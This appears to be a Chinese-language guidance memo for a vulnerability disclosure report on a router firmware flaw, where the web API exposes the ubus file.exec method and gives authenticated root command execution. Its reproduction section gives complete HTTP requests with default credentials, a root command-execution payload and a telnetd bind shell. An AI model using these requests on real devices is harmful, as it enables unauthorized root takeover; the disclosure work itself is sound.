# 暴露 `file.exec` 的 Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_file_exec_rce_report.md`

这条不是传统“命令注入”，而是危险原始 ubus 方法被 Web 暴露，需要在正式稿里定性准确。

## 2. 一句话结论

真实链路是：

```text
/api/esps
  -> /www/api 鉴权后进入 FCGI_EspsProcess
  -> magic_link 不限制 object 名称
  -> 直接转发 object=file, method=exec
  -> 原生 ubus 方法以 root 权限执行指定 command/params/env
```

因此这里的核心问题是：

- raw ubus dangerous method exposure

而不是：

- shell metacharacter injection

## 3. 关键静态/运行时证据

### 3.1 `magic_link` 没有对象白名单

`/usr/lib/lua/magic_link/magic_link.lua` 第 `12-25` 行可直接引用：

- `path = tostring(v.object)`
- `func = tostring(v.method)`
- `args = v.param`

这说明 `/api/esps` 不只转发 `esps.*`，而是可转发任意可访问 ubus 对象。

### 3.2 `file.exec` 是原生危险能力

PoC 与运行时枚举已经证明：

```text
file.exec {"command":"String","params":"Array","env":"Table"}
```

这个方法本身就是执行程序，不需要利用引号、分号、`$()` 之类特殊字符。

### 3.3 `rpcd` 字符串可作为辅助静态证据

`/sbin/rpcd` 字符串中可看到：

- `rpc_exec`
- `execv`
- `/usr/libexec/rpcd/%s`

这说明固件的 RPC/ubus 体系中本身就存在原生命令执行能力，与 `file.exec` 的危险属性是吻合的。

## 4. 正式稿建议补强点

### 4.1 把定性从“injection”改成“dangerous method exposure”

这条漏洞更准确的描述应该是：

- authenticated remote root command execution through exposed dangerous ubus method

### 4.2 建议加入“不需要特殊字符”的描述

这是这条漏洞和其他 shell 注入型 CVE 最明显的差异：

- 普通命令即可执行
- 直接通过 JSON 参数数组传递

## 5. 建议补充的验证内容

报告里最好加入一个更简单的手工验证：

- `command=/bin/sh`
- `params=["-c","id; uname -a; echo FILE_EXEC_OK >/tmp/file_exec_marker"]`

这样回包里的 `stdout` 就可能直接带出 `uid=0(root)`，不一定非要靠 `telnetd`。

## 6. 建议结论写法

> The vulnerability is not caused by unsafe shell parsing in a product-specific script. Instead, the web API exposes the native ubus method `file.exec`, which is itself a privileged command-execution primitive.

## 7. BurpSuite 逐步复现

这条漏洞最适合用 Burp 直接证明，因为最小化验证甚至不需要再开一个 telnet shell。

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`

### 7.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应里取：

- `data.session`

后续所有 `/api/esps` 包都写：

- `AUTHENTICATION: <SESSION>`

### 7.2 包 2：最小化证明包，直接从响应里拿 root 输出

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","id; uname -a; echo FILE_EXEC_OK >/tmp/file_exec_marker"],"env":{}}}]
```

预期直接在响应 JSON 里看到：

- `code = 0`
- `stdout` 包含 `uid=0(root)`

这已经足够证明漏洞成立。

### 7.3 可选包：如果你想拿交互 shell

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","echo FILE_EXEC_OK >/tmp/file_exec_marker; telnetd -p2350 -l /bin/sh"],"env":{}}}]
```

然后连接：

```bash
telnet 192.168.8.1 2350
```

或：

```bash
nc 192.168.8.1 2350
```

进入后执行：

```sh
id
uname -a
cat /tmp/file_exec_marker
```

### 7.4 可选清理包：关闭临时 shell

如果你用了上面的交互 shell 方案，可以再发一个 `file.exec` 清理包：

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"file","method":"exec","param":{"command":"/bin/sh","params":["-c","pid=$(ps w | awk '/telnetd -p2350/ && !/awk/ {print $1}'); [ -n \"$pid\" ] && kill \"$pid\"; echo cleaned"],"env":{}}}]
```
